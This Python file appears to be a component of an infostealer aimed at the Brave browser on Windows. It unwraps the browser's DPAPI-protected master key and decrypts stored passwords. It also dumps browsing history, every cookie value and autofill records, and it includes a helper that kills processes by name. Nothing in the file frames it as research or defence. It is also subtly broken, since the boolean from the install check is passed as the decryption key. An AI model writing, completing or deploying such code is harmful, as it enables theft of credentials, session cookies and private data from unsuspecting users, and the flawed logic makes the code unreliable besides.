import os,sys,io
import json
import shutil
import base64
import sqlite3
import browser_cookie3
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timezone, timedelta
import wmi

class Brave:
    def __init__(self):
        self._user_data = os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data"
        
        self._master_key = self.get_installed_browsers()
        
    def get_installed_browsers(self):
        default_dir_paths = ["C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                             "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"]
        for path in default_dir_paths:
            if os.path.exists(path):
                return True
        return False

    def kill_program(self,program_name):
        try:
            f = wmi.WMI()
            for process in f.Win32_Process():
                if program_name in process.Name:
                    process.Terminate()
                    return True
            return False
        except Exception as e:
            return False

    def _get_master_key(self):
        try:
            if self._master_key:
                with open(self._user_data + "\\Local State", "r") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
            else:
                return "Bavre browsers is not installed!!!!"
        except Exception as e:
            return e

    @staticmethod
    def _decrypt(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return str(e)

    @staticmethod
    def _convert_time(time):
        try:
            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
            code_stamp = epoch + timedelta(microseconds=time)
            return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')
        except Exception as e:
            return e

    def brave_passwords(self):
        try:
            if self._master_key:
                login_db = self._user_data + "\\Default\\Login Data"
                login_db_copy = os.getenv("TEMP") + "\\Login.db"
                shutil.copy2(login_db, login_db_copy)
                conn = sqlite3.connect(login_db_copy)
                cursor = conn.cursor()

                password_data = ""
                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for item in cursor.fetchall():
                        url = item[0]
                        username = item[1]
                        encrypted_password = item[2]
                        decrypted_password = self._decrypt(encrypted_password, self._master_key)
                        result = f"URLs: {url}\n"
                        result += f"Username: {username}\n"
                        result += f"Password: {decrypted_password}\n\n"
                        password_data += result
                        # password_data.append({'url': url, 'username': username, 'password': decrypted_password})

                except sqlite3.Error:
                    pass

                cursor.close()
                conn.close()
                os.remove(login_db_copy)
                return password_data
            else:
                return "Brave browser is not installed!!!!"
        except Exception as e:
            return e
            
    def get_brave_history(self):
        try:
            if self._master_key:
                message =""
                sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
                history_file_path = self._user_data + "\\Default\\History"
                try:
                    conn = sqlite3.connect(history_file_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title FROM urls")
                    results = cursor.fetchall()
                    for row in results:
                        messages = f"Urls: {row[0]}\n"
                        messages+= f"Title: {row[1]}\n\n"
                        message += messages
                    return message
                except:
                    return None
            else:
                return "Brave browser is not installed!!!!"
        except Exception as e:
            return e
        
    def brave_cookies(self):
        try:
            if self._master_key:
                cookies_data = ""
                cookies = list(browser_cookie3.brave())
                for cookie in cookies:
                    data_cookies = f"Cookies Name: {cookie.name} \n"
                    data_cookies += f"Cookies domain : {cookie.domain} \n"
                    data_cookies += f"Cookies Values : {cookie.value} \n"
                    data_cookies += f"Cookies expires : {cookie.expires} \n\n"
                    cookies_data += data_cookies
                return cookies_data 
            else:
                return "Brave Browser is not installed!!!!!!" 
        except Exception as e:
            return e

    def get_edge_autofill_data(self):
        try:
            if self._master_key:
                db_path =self._user_data + "\\Default\\Web Data"
                try:
                    conn = sqlite3.connect(db_path)
                    c = conn.cursor()
                    c.execute("SELECT * FROM autofill")
                    autofill_data = c.fetchall()
                    return autofill_data
                except sqlite3.Error as e:
                    print("Error retrieving autofill data:", e)
                    return None
                finally:
                    if conn:
                        conn.close()
            else:
                return "Brave browsers is not installed !!!!!"
        except Exception as e:
            return e

if __name__ == "__main__":
    brave = Brave()
   

    